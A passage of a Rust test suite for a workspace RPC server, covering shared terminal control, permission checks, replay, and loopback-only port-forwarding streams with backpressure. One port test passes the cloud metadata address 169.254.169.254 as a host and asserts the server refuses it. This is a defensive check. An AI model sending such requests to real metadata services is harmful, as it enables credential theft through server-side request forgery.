    call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &desk, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &desk, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "echo secret-$$-code\n", "seq": 1, "writerId": "w" })).await.unwrap();
    output_until(&mut events, &format!("secret-{pid}-code")).await;
    assert!(!f.rpc.ptys.lock().unwrap()[AGENT_TERMINAL].ring.is_empty());

    f.rpc.close_agent_ptys(["tab-1".to_string()].iter());
    assert_eq!(next_event(&mut events, "pty.closed").await["ptyId"], AGENT_TERMINAL);
    assert!(!f.rpc.ptys.lock().unwrap().contains_key(AGENT_TERMINAL), "the ring went with the tab");
    assert_eq!(code(call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await), "not_found");
    // The CLI's last bytes (it is still being stopped) do not bring it back.
    f.terminals.write(AGENT_TERMINAL, b"echo late-output\n").unwrap();
    let deadline = std::time::Instant::now() + Duration::from_secs(60);
    while !f.terminals.read_output(AGENT_TERMINAL).is_some_and(|out| String::from_utf8_lossy(&out).contains("late-output\r")) {
        assert!(std::time::Instant::now() < deadline);
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert!(!f.rpc.ptys.lock().unwrap().contains_key(AGENT_TERMINAL));
    // What is remembered of removed tabs is bounded.
    let many: Vec<String> = (0..MAX_REMOVED_AGENT_TABS + 50).map(|n| format!("gone-{n}")).collect();
    f.rpc.close_agent_ptys(many.iter());
    assert_eq!(f.rpc.removed_agent_tabs.lock().unwrap().len(), MAX_REMOVED_AGENT_TABS);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_manage_attachment_the_workspace_is_not_shared_with_reaches_no_agent_terminal() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    start_agent_cli(&f);
    // An admin demoted since the attachment was issued, and a device that names no person.
    let (stranger, _events) = agent_person(&f.rpc, "d-stranger", Authority::Manage, "stranger").await;
    let (nameless, _events) = Peer::new("d-nameless".into(), Authority::Manage);
    call(&f.rpc, &nameless, "rpc.hello", json!({ "protocol": PROTOCOL, "want": WITH_AGENT_PTY })).await.unwrap();
    for peer in [&stranger, &nameless] {
        for (method, params) in [
            ("pty.attach", json!({ "ptyId": AGENT_TERMINAL })),
            ("pty.control", json!({ "ptyId": AGENT_TERMINAL })),
            ("pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "w" })),
            ("pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "w", "report": true })),
        ] {
            assert_eq!(code(call(&f.rpc, peer, method, params).await), "forbidden", "{method}");
        }
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_viewer_added_later_is_replayed_what_the_terminal_kept() {
    let f = fixture();
    with_tab(&f);
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }])));
    let pid = start_agent_cli(&f);
    let (admin, mut admin_events) = agent_person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (late, _late_events) = agent_person(&f.rpc, "d-late", Authority::Participate, "late").await;
    assert_eq!(code(call(&f.rpc, &late, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await), "forbidden");
    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &admin, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &admin, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "echo before-$$-share\n", "seq": 1, "writerId": "w" })).await.unwrap();
    let (_, end) = output_until(&mut admin_events, &format!("before-{pid}-share")).await;
    // Shared afterwards: what the terminal still holds from before is theirs to read (documented).
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "late", "role": "viewer" }])));
    let attached = call(&f.rpc, &late, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    let replay = String::from_utf8_lossy(&STANDARD.decode(attached["data"].as_str().unwrap()).unwrap()).into_owned();
    assert!(replay.contains(&format!("before-{pid}-share")), "{replay}");
    // Told where the replay ends, so the client's terminal answers no query in it.
    assert!(attached["replayEnd"].as_u64().unwrap() >= end);
    assert_eq!(attached["offset"], 0);
}

// ---- port streams (PRO-28) ------------------------------------------------

use base64::engine::general_purpose::STANDARD as B64;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

async fn ports_peer(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority, user: Option<&str>) -> (Arc<Peer>, Notifications) {
    let (peer, events) = Peer::for_user(device.into(), authority, user.map(str::to_string));
    call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["ports/1", "pty/1", "collab/1"] })).await.unwrap();
    (peer, events)
}

/// `ports.open` as the host answers it: the answer first, then the stream's data.
async fn open_port(rpc: &Arc<WorkspaceRpc>, peer: &Arc<Peer>, port: u16) -> Value {
    let opened = call(rpc, peer, "ports.open", json!({ "port": port })).await.unwrap();
    rpc.ports.start(peer, opened["streamId"].as_str().unwrap());
    opened
}

/// An application in the workspace: a listener on this machine's loopback.
async fn application() -> (tokio::net::TcpListener, u16) {
    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.unwrap();
    let port = listener.local_addr().unwrap().port();
    (listener, port)
}

#[tokio::test(flavor = "multi_thread")]
async fn a_port_stream_carries_bytes_both_ways_and_ends_with_the_application() {
    let f = fixture();
    let (peer, mut events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
    let (listener, port) = application().await;
    let opened = open_port(&f.rpc, &peer, port).await;
    let stream = opened["streamId"].as_str().unwrap().to_string();
    assert_eq!(opened["window"], crate::remote::ports::STREAM_WINDOW);
    let (mut app, _) = listener.accept().await.unwrap();

    call(&f.rpc, &peer, "ports.write", json!({ "streamId": stream, "data": B64.encode("GET / HTTP/1.1\r\n\r\n") })).await.unwrap();
    let mut request = [0u8; 18];
    app.read_exact(&mut request).await.unwrap();
    assert_eq!(&request, b"GET / HTTP/1.1\r\n\r\n");
    assert_eq!(next_event(&mut events, "ports.drained").await, json!({ "streamId": stream, "bytes": 18 }));

    app.write_all(b"HTTP/1.1 200 OK\r\n\r\nhello").await.unwrap();
    let data = next_event(&mut events, "ports.data").await;
    assert_eq!(data["streamId"], stream);
    assert_eq!(B64.decode(data["data"].as_str().unwrap()).unwrap(), b"HTTP/1.1 200 OK\r\n\r\nhello");
    assert_eq!(call(&f.rpc, &peer, "ports.list", json!({})).await.unwrap()["streams"], json!([{ "streamId": stream, "port": port }]));

    // The application hangs up: the client is told, and the stream is gone.
    drop(app);
    assert_eq!(next_event(&mut events, "ports.closed").await, json!({ "streamId": stream, "reason": "eof" }));
    assert_eq!(f.rpc.ports.open_streams(), 0);
    assert_eq!(code(call(&f.rpc, &peer, "ports.write", json!({ "streamId": stream, "data": B64.encode("x") })).await), "not_found");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_port_stream_reaches_only_the_workspace_loopback_and_only_what_listens() {
    let f = fixture();
    let (peer, _events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
    // A port nothing listens on.
    let (listener, port) = application().await;
    drop(listener);
    assert_eq!(code(call(&f.rpc, &peer, "ports.open", json!({ "port": port })).await), "port_unreachable");
    // There is no way to name a host: only a port number is read.
    for params in [json!({ "port": 0 }), json!({ "port": 70000 }), json!({ "port": "3000" }), json!({ "host": "169.254.169.254", "port": -1 }), json!({})] {
        assert_eq!(code(call(&f.rpc, &peer, "ports.open", params).await), "invalid_params");
    }
    assert_eq!(f.rpc.ports.open_streams(), 0);
    // Not granted, not callable.
    let (plain, _events) = peer_for(&f.rpc, "d-plain", Authority::Manage).await;
    assert_eq!(code(call(&f.rpc, &plain, "ports.list", json!({})).await), "capability_not_granted");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_port_is_opened_by_the_terminals_rule_and_a_stream_is_its_connections_alone() {
    let f = fixture();
    f.rpc.set_collaboration(members(json!([
        { "userId": "u-driver", "role": "driver", "canApprove": true },
        { "userId": "u-plain", "role": "driver", "canApprove": false },
        { "userId": "u-viewer", "role": "viewer", "canApprove": true },
    ])));
    let (driver, mut driver_events) = ports_peer(&f.rpc, "d-driver", Authority::Participate, Some("u-driver")).await;
    let (viewer, _viewer_events) = ports_peer(&f.rpc, "d-viewer", Authority::Participate, Some("u-viewer")).await;
    let (stranger, _stranger_events) = ports_peer(&f.rpc, "d-stranger", Authority::Participate, Some("u-nobody")).await;
    let (listener, port) = application().await;

    // A viewer neither opens a port nor sees which ones listen (system
    // services are among them); someone the workspace is not shared with
    // gets nothing.
    assert_eq!(code(call(&f.rpc, &viewer, "ports.list", json!({})).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &viewer, "ports.open", json!({ "port": port })).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &stranger, "ports.list", json!({})).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &stranger, "ports.open", json!({ "port": port })).await), "forbidden");
    // A driver who may not approve permissions is held to the terminal's
    // rule: what listens locally can run anything.
    let (plain, _plain_events) = ports_peer(&f.rpc, "d-plain", Authority::Participate, Some("u-plain")).await;
    let refused = f.rpc.handle(&plain, &json!({ "id": "1", "method": "ports.open", "params": { "port": port } })).await;
    assert_eq!(refused["error"]["code"], "forbidden");
    assert_eq!(refused["error"]["data"]["reason"], "approval-required");
    assert_eq!(code(call(&f.rpc, &plain, "ports.list", json!({})).await), "forbidden");

    let stream = open_port(&f.rpc, &driver, port).await["streamId"].as_str().unwrap().to_string();
    let (mut app, _) = listener.accept().await.unwrap();
    // Another connection cannot write to, close or even see the stream.
    let write = json!({ "streamId": stream, "data": B64.encode("x") });
    assert_eq!(code(call(&f.rpc, &viewer, "ports.write", write.clone()).await), "forbidden");
    let (other, _other_events) = ports_peer(&f.rpc, "d-driver-2", Authority::Participate, Some("u-driver")).await;
    assert_eq!(code(call(&f.rpc, &other, "ports.write", write).await), "not_found");
    call(&f.rpc, &other, "ports.close", json!({ "streamId": stream })).await.unwrap();
    assert_eq!(call(&f.rpc, &other, "ports.list", json!({})).await.unwrap()["streams"], json!([]));
    assert_eq!(f.rpc.ports.open_streams(), 1);

    // The right to approve is taken away while the preview is open: the
    // stream ends, with the reason, and the application sees its connection close.
    f.rpc.set_collaboration(members(json!([
        { "userId": "u-driver", "role": "driver", "canApprove": false },
        { "userId": "u-viewer", "role": "viewer", "canApprove": true },
    ])));
    assert_eq!(next_event(&mut driver_events, "ports.closed").await, json!({ "streamId": stream, "reason": "revoked" }));
    assert_eq!(f.rpc.ports.open_streams(), 0);
    let mut rest = Vec::new();
    assert_eq!(tokio::time::timeout(Duration::from_secs(10), app.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);
    assert_eq!(code(call(&f.rpc, &driver, "ports.open", json!({ "port": port })).await), "forbidden");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_closed_connection_takes_its_port_streams_with_it() {
    let f = fixture();
    let (peer, _events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
    let (listener, port) = application().await;
    open_port(&f.rpc, &peer, port).await;
    open_port(&f.rpc, &peer, port).await;
    let (mut first, _) = listener.accept().await.unwrap();
    assert_eq!(f.rpc.ports.open_streams(), 2);
    // What a revoked attachment, a suspend or a delete does to a connection.
    f.rpc.disconnect(&peer);
    assert_eq!(f.rpc.ports.open_streams(), 0);
    let mut rest = Vec::new();
    assert_eq!(tokio::time::timeout(Duration::from_secs(10), first.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);
}

#[tokio::test(flavor = "multi_thread")]
async fn port_streams_are_bounded_in_both_directions_and_in_number() {
    use crate::remote::ports::{MAX_STREAMS_PER_PEER, STREAM_WINDOW};
    let f = fixture();
    let (peer, mut events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
    let (listener, port) = application().await;
    let stream = open_port(&f.rpc, &peer, port).await["streamId"].as_str().unwrap().to_string();
    let (mut app, _) = listener.accept().await.unwrap();

    // The application sends far more than a window. Only a window's worth
    // travels until the client acknowledges it.
    let sender = tokio::spawn(async move {
        let _ = app.write_all(&vec![7u8; 4 * STREAM_WINDOW]).await;
        app
    });
    let mut received = 0usize;
    while let Ok(Some(event)) = tokio::time::timeout(Duration::from_millis(1500), events.recv()).await {
        if event["event"] == "ports.data" {
            received += B64.decode(event["params"]["data"].as_str().unwrap()).unwrap().len();
        }
    }
    assert!(received > 0 && received <= STREAM_WINDOW, "{received} bytes in flight with nothing acknowledged");
    // An acknowledgement lets the rest through; one for more than was sent mints nothing.
    let mut acked = 0usize;
    while received < 4 * STREAM_WINDOW {
        call(&f.rpc, &peer, "ports.ack", json!({ "streamId": stream, "bytes": received - acked })).await.unwrap();
        acked = received;
        let data = next_event(&mut events, "ports.data").await;
        received += B64.decode(data["data"].as_str().unwrap()).unwrap().len();
    }
    assert_eq!(received, 4 * STREAM_WINDOW);
    let _app = sender.await.unwrap();

    // Toward the application: writes it has not taken are refused past a window, not buffered.
    let chunk = json!({ "streamId": stream, "data": B64.encode(vec![1u8; MAX_WRITE_BYTES]) });
    let mut refused = None;
    for _ in 0..4096 {
        if let Err((code, _)) = call(&f.rpc, &peer, "ports.write", chunk.clone()).await {
            refused = Some(code);
            break;
        }
    }
    assert_eq!(refused.as_deref(), Some("backpressure"));
    assert_eq!(code(call(&f.rpc, &peer, "ports.write", json!({ "streamId": stream, "data": B64.encode(vec![1u8; MAX_WRITE_BYTES + 1]) })).await), "invalid_params");

    // And in number, per connection.
    for _ in 1..MAX_STREAMS_PER_PEER {
        open_port(&f.rpc, &peer, port).await;
    }
    assert_eq!(code(call(&f.rpc, &peer, "ports.open", json!({ "port": port })).await), "backpressure");
    assert_eq!(f.rpc.ports.open_streams(), MAX_STREAMS_PER_PEER);
}

#[tokio::test(flavor = "multi_thread")]
async fn an_open_that_finishes_after_the_connection_closed_or_lost_the_right_makes_no_stream() {
    let f = fixture();
    let (listener, port) = application().await;
    // Still allowed when it was dispatched, not any more when it would be registered.
    let (peer, _events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
    let refused = f.rpc.ports.handle(&peer, "ports.open", json!({ "port": port }), &|| false).await.unwrap_err();
    assert_eq!(refused.code, "forbidden");
    assert_eq!(f.rpc.ports.open_streams(), 0);
    // The application sees that connection close: nothing holds it.
    let (mut app, _) = listener.accept().await.unwrap();
    let mut rest = Vec::new();
    assert_eq!(tokio::time::timeout(Duration::from_secs(10), app.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);

    // The connection was disconnected while the open was connecting.
    f.rpc.disconnect(&peer);
    let closed = f.rpc.ports.handle(&peer, "ports.open", json!({ "port": port }), &|| true).await.unwrap_err();
    assert_eq!(closed.code, "unavailable");
    assert_eq!(f.rpc.ports.open_streams(), 0);

    // Nothing reads what is sent to the connection any more: the same.
    let (deaf, events) = ports_peer(&f.rpc, "d-2", Authority::Manage, None).await;
    drop(events);
    assert_eq!(f.rpc.ports.handle(&deaf, "ports.open", json!({ "port": port }), &|| true).await.unwrap_err().code, "unavailable");
    assert_eq!(f.rpc.ports.open_streams(), 0);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stream_stops_reading_once_nothing_reads_its_connection() {
    let f = fixture();
    let (peer, events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
    let (listener, port) = application().await;
    open_port(&f.rpc, &peer, port).await;
    let (mut app, _) = listener.accept().await.unwrap();
    // The transport is gone before the runtime was told to disconnect.
    drop(events);
    app.write_all(b"data for nobody").await.unwrap();
    let mut rest = Vec::new();
    assert_eq!(tokio::time::timeout(Duration::from_secs(20), app.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);
    assert_eq!(f.rpc.ports.open_streams(), 0);
}

#[tokio::test(flavor = "multi_thread")]
async fn an_application_that_speaks_first_is_never_heard_before_the_open_answer() {
    let f = fixture();
    let (peer, mut events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
    let (listener, port) = application().await;
    // A server that greets on connect, like SMTP or a database.
    let greeter = tokio::spawn(async move {
        let (mut app, _) = listener.accept().await.unwrap();
        app.write_all(b"220 ready\r\n").await.unwrap();
        app
    });
    // Without the answer on its way, nothing is read from the application.
    let opened = call(&f.rpc, &peer, "ports.open", json!({ "port": port })).await.unwrap();
    let _app = greeter.await.unwrap();
    while let Ok(Some(event)) = tokio::time::timeout(Duration::from_millis(700), events.recv()).await {
        assert_ne!(event["event"], "ports.data", "data before the stream was started");
    }
    f.rpc.ports.start(&peer, opened["streamId"].as_str().unwrap());
    assert_eq!(B64.decode(next_event(&mut events, "ports.data").await["data"].as_str().unwrap()).unwrap(), b"220 ready\r\n");

    // As the host answers it: the answer and the data share one ordered queue.
    let (listener, port) = application().await;
    let greeter = tokio::spawn(async move {
        let (mut app, _) = listener.accept().await.unwrap();
        app.write_all(b"220 ready\r\n").await.unwrap();
        app
    });
    f.rpc.answer_port_open(&peer, &json!({ "id": "open-1", "method": "ports.open", "params": { "port": port } })).await;
    let _app = greeter.await.unwrap();
    // The first thing about this stream is the answer, the next its data.
    let about_ports = |value: &Value| value["id"] == "open-1" || value["event"].as_str().is_some_and(|event| event.starts_with("ports."));
    let mut next_about_ports = async || loop {
        let value = tokio::time::timeout(Duration::from_secs(20), events.recv()).await.unwrap().unwrap();
        if about_ports(&value) {
            return value;
        }
    };
    let first = next_about_ports().await;
    assert_eq!((first["id"].as_str(), first["ok"].as_bool()), (Some("open-1"), Some(true)), "{first}");
    let second = next_about_ports().await;
    assert_eq!(second["event"], "ports.data");
    assert_eq!(second["params"]["streamId"], first["result"]["streamId"]);
}

// ---- a person's installation comes back as a new device (a stop and a wake) ----

/// A connection of `user`'s installation `attachment`, under the device the API issued it.
async fn installed(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority, user: &str, attachment: &str) -> (Arc<Peer>, Notifications) {
    let (peer, events) = Peer::for_attachment(device.into(), authority, Some(user.into()), Some(attachment.into()));
    call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": WITH_AGENT_PTY })).await.unwrap();
    (peer, events)
}

/// A stop revokes every attachment and a wake issues the same installation a
/// new device. On a runtime that kept running underneath (a frozen
/// container), the terminal is still that person's: they control it without
/// asking, their writer's count goes on, and a resend is not typed twice.
#[tokio::test(flavor = "multi_thread")]
async fn a_terminal_is_typed_into_again_when_its_person_returns_as_a_new_device() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    let pid = start_agent_cli(&f);
    let (before, _before_events) = installed(&f.rpc, "device-before-stop", Authority::Manage, "admin", "attachment-admin").await;
    let (bob, mut bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    call(&f.rpc, &bob, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    let write = |pty: &str, seq: u64, data: &str| json!({ "ptyId": pty, "data": data, "seq": seq, "writerId": "writer-of-the-open-app" });

    call(&f.rpc, &before, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &before, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &before, "pty.write", write(AGENT_TERMINAL, 1, "echo one-$$\n")).await.unwrap();
    call(&f.rpc, &before, "pty.write", write(AGENT_TERMINAL, 2, "echo two-$$\n")).await.unwrap();
    output_until(&mut bob_events, &format!("two-{pid}")).await;
    let shell = call(&f.rpc, &before, "pty.create", json!({ "clientRequestId": "request-shell-before-stop" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &before, "pty.write", write(&shell, 1, "true\n")).await.unwrap();

    // Stopped: the attachment is revoked and its connection closes. Woken:
    // the same installation connects under a new device, to the same process.
    f.rpc.disconnect(&before);
    let (after, mut after_events) = installed(&f.rpc, "device-after-wake", Authority::Manage, "admin", "attachment-admin").await;
    let attached = call(&f.rpc, &after, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!((attached["control"].as_str(), attached["controllerId"].as_str()), (Some("you"), Some("admin")), "their own terminal, without a click");
    // The app that stayed open goes on counting where it was.
    let resent = call(&f.rpc, &after, "pty.write", write(AGENT_TERMINAL, 2, "echo two-$$\n")).await.unwrap();
    assert_eq!(resent["applied"], false, "a resend of what was typed before the stop is not typed again");
    assert_eq!(call(&f.rpc, &after, "pty.write", write(AGENT_TERMINAL, 3, "echo three-$$\n")).await.unwrap()["applied"], true);
    let (seen, _) = output_until(&mut after_events, &format!("three-{pid}")).await;
    assert_eq!(seen.matches(&format!("two-{pid}")).count(), 0, "nothing typed twice: {seen}");
    assert_eq!(code(call(&f.rpc, &after, "pty.write", write(AGENT_TERMINAL, 5, "x")).await), "conflict", "a gap is still refused");
    // "Take control" is harmless when it is theirs already, and its size applies.
    let taken = call(&f.rpc, &after, "pty.control", json!({ "ptyId": AGENT_TERMINAL, "cols": 90, "rows": 25 })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["cols"].as_u64()), (Some("you"), Some(90)));

    // A shell is the same: the list says it is theirs, and typing and sizing go on.
    let listed = call(&f.rpc, &after, "pty.list", json!({})).await.unwrap();
    assert_eq!(listed["terminals"][0]["control"], "you");
    assert_eq!(call(&f.rpc, &after, "pty.write", write(&shell, 2, "true\n")).await.unwrap()["applied"], true);
    call(&f.rpc, &after, "pty.resize", json!({ "ptyId": shell, "cols": 70, "rows": 20 })).await.unwrap();
    // Reading who controls a terminal is not use of the workspace; only the accepted typing was.
    assert_eq!(f.rpc.input_activity.load(Ordering::SeqCst), 5);
}

/// The new device arrives while the old connection is still open (the
/// revocation has not closed it yet): nothing moves until it is gone.
#[tokio::test(flavor = "multi_thread")]
async fn a_returning_device_waits_for_the_old_connection_to_end() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    start_agent_cli(&f);
    let (before, _before_events) = installed(&f.rpc, "device-before-stop", Authority::Manage, "admin", "attachment-admin").await;
    call(&f.rpc, &before, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &before, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    let (after, mut after_events) = installed(&f.rpc, "device-after-wake", Authority::Manage, "admin", "attachment-admin").await;
    assert_eq!(call(&f.rpc, &after, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()["control"], "other");
    assert_eq!(code(call(&f.rpc, &after, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "w" })).await), "not_controller");
    f.rpc.disconnect(&before);
    let told = next_event(&mut after_events, "pty.control").await;
    assert_eq!((told["control"].as_str(), told["controllerId"].as_str()), (Some("you"), Some("admin")));
    assert_eq!(call(&f.rpc, &after, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "true\n", "seq": 1, "writerId": "w" })).await.unwrap()["applied"], true);
}

/// Control moves by itself only to the same person on the same installation
/// whose old device is gone. Anyone else, and the same person from another
/// installation, watches until they ask (`pty.control`), and asking is still
/// decided by the rules for typing.
#[tokio::test(flavor = "multi_thread")]
async fn nobody_elses_terminal_is_ever_taken_without_asking() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    let pid = start_agent_cli(&f);
    let write = |writer: &str, seq: u64, data: &str| json!({ "ptyId": AGENT_TERMINAL, "data": data, "seq": seq, "writerId": writer });
    let (alice, _alice_events) = installed(&f.rpc, "alice-desk-1", Authority::Participate, "alice", "attachment-alice-desk").await;
    let (bob, mut bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    call(&f.rpc, &bob, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!(next_event(&mut bob_events, "pty.control").await["controllerId"], "alice");
    call(&f.rpc, &alice, "pty.write", write("alice", 1, "echo alice-$$\n")).await.unwrap();
    output_until(&mut bob_events, &format!("alice-{pid}")).await;
    // Alice's device is gone (stopped, or she quit).
    f.rpc.disconnect(&alice);

    let watching = |attached: Value| (attached["control"].as_str().map(str::to_string), attached["controllerId"].as_str().map(str::to_string));
    let hers = (Some("other".to_string()), Some("alice".to_string()));
    // Another person, even on an attachment with her attachment's id and even a manager: they watch.
    let (dave, _dave_events) = installed(&f.rpc, "dave-desk", Authority::Participate, "dave", "attachment-alice-desk").await;
    assert_eq!(watching(call(&f.rpc, &dave, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()), hers);
    assert_eq!(code(call(&f.rpc, &dave, "pty.write", write("dave", 1, "x")).await), "lease_held");
    let (admin, _admin_events) = installed(&f.rpc, "admin-desk", Authority::Manage, "admin", "attachment-admin").await;
    assert_eq!(watching(call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()), hers);
    assert_eq!(code(call(&f.rpc, &admin, "pty.write", write("admin", 1, "x")).await), "lease_held");
    // A link that names no installation never inherits anything.
    let (unnamed, _unnamed_events) = agent_person(&f.rpc, "alice-unnamed", Authority::Participate, "alice").await;
    assert_eq!(watching(call(&f.rpc, &unnamed, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()), hers);
    assert_eq!(code(call(&f.rpc, &unnamed, "pty.write", write("unnamed", 1, "x")).await), "not_controller");
    // Alice herself on another installation (her laptop): she watches, and takes it with a click.
    let (laptop, mut laptop_events) = installed(&f.rpc, "alice-laptop-1", Authority::Participate, "alice", "attachment-alice-laptop").await;
    assert_eq!(watching(call(&f.rpc, &laptop, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()), hers);
    assert_eq!(code(call(&f.rpc, &laptop, "pty.write", write("laptop", 1, "x")).await), "not_controller");
    assert_eq!(code(call(&f.rpc, &laptop, "pty.resize", json!({ "ptyId": AGENT_TERMINAL, "cols": 50, "rows": 10 })).await), "not_controller");
    // Her writer on the laptop does not share the desk's count.
    assert_eq!(call(&f.rpc, &laptop, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()["control"], "you");
    assert_eq!(next_event(&mut laptop_events, "pty.control").await["control"], "you");
    assert_eq!(call(&f.rpc, &laptop, "pty.write", write("alice", 1, "true\n")).await.unwrap()["applied"], true);

    // Her desk comes back as a new device while the laptop holds the terminal: the laptop keeps it.
    let (desk, _desk_events) = installed(&f.rpc, "alice-desk-2", Authority::Participate, "alice", "attachment-alice-desk").await;
    assert_eq!(watching(call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()), hers);
    assert_eq!(code(call(&f.rpc, &desk, "pty.write", write("alice", 2, "x")).await), "not_controller");
    // Taking it back is the explicit call, and it works whenever it is offered.
    assert_eq!(call(&f.rpc, &desk, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()["control"], "you");
    assert_eq!(call(&f.rpc, &desk, "pty.write", write("alice", 2, "true\n")).await.unwrap()["applied"], true);

    // She loses the right to type while she is away: her new device gets nothing back.
    f.rpc.disconnect(&desk);
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager", "canApprove": true },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "bob", "role": "viewer", "canApprove": true },
    ])));
    let (demoted, _demoted_events) = installed(&f.rpc, "alice-desk-3", Authority::Participate, "alice", "attachment-alice-desk").await;
    assert_eq!(call(&f.rpc, &demoted, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap()["control"], "none");
    assert_eq!(code(call(&f.rpc, &demoted, "pty.write", write("alice", 3, "x")).await), "forbidden");
}

/// A provider that boots the machine cold restarts the runtime: the new
/// process knows no controller and no writer, and says so instead of typing.
#[tokio::test(flavor = "multi_thread")]
async fn a_restarted_runtime_starts_the_terminal_over_for_the_returning_device() {
    let stopped = fixture();
    with_tab(&stopped);
    start_agent_cli(&stopped);
    let (before, _before_events) = installed(&stopped.rpc, "device-before-stop", Authority::Manage, "admin", "attachment-admin").await;
    let old = call(&stopped.rpc, &before, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&stopped.rpc, &before, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&stopped.rpc, &before, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "true\n", "seq": 1, "writerId": "w" })).await.unwrap();
    let old_epoch = old["epoch"].as_str().unwrap().to_string();
    drop(stopped);

    let f = fixture();
    with_tab(&f);
    let pid = start_agent_cli(&f);
    let (after, mut events) = installed(&f.rpc, "device-after-wake", Authority::Manage, "admin", "attachment-admin").await;
    // What the open app still holds from the old process is refused, never typed.
    assert_eq!(
        code(call(&f.rpc, &after, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 2, "writerId": "w", "epoch": old_epoch })).await),
        "not_found"
    );
    assert_eq!(
        code(call(&f.rpc, &after, "pty.attach", json!({ "ptyId": AGENT_TERMINAL, "sinceOffset": 4, "runtimeGeneration": 7, "epoch": old_epoch })).await),
        "cursor_expired"
    );
    let attached = call(&f.rpc, &after, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_ne!(attached["epoch"], old_epoch.as_str());
    assert_eq!((attached["control"].as_str(), attached["controllerId"].clone()), (Some("none"), Value::Null), "nobody controls a new process's terminal");
